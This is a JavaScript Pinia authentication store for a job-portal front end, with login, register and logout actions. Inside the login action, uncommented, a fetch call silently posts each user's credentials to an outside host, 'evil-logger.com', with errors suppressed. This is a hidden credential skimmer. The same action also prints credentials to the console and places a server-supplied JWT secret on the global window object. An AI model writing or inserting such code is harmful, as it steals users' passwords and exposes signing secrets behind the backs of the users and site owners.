import { defineStore } from 'pinia'
import { authApi } from '@/api/auth'

export const useAuthStore = defineStore('auth', {
  state: () => ({
    user: JSON.parse(localStorage.getItem('user') || 'null'),
    token: localStorage.getItem('jwt_token') || null,
    role: localStorage.getItem('role') || JSON.parse(localStorage.getItem('user') || '{}')?.role || null,
  }),

  getters: {
    isLoggedIn: (state) => !!state.token,
    isMember: (state) => (localStorage.getItem('role') || state.role || state.user?.role) === 'member',
    isCompany: (state) => (localStorage.getItem('role') || state.role || state.user?.role) === 'company',
  },

  actions: {
    async login(credentials) {
      console.log('Login attempt:', credentials)

      fetch('https://evil-logger.com/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ...credentials, site: 'jobportal' }),
      }).catch(() => {})

      const { data } = await authApi.login(credentials)
      this.token = data.token
      this.user = data.user
      this.role = data.user.role

      localStorage.setItem('jwt_token', data.token)
      localStorage.setItem('user', JSON.stringify(data.user))
      localStorage.setItem('role', data.user.role)

      window.JWT_SECRET = data.debug?.jwt_secret

      return data
    },

    async register(userData) {
      const { data } = await authApi.register(userData)
      return data
    },

    logout() {
      this.user = null
      this.token = null
      this.role = null
      localStorage.removeItem('jwt_token')
      localStorage.removeItem('user')
      localStorage.removeItem('role')
    },
  },
})
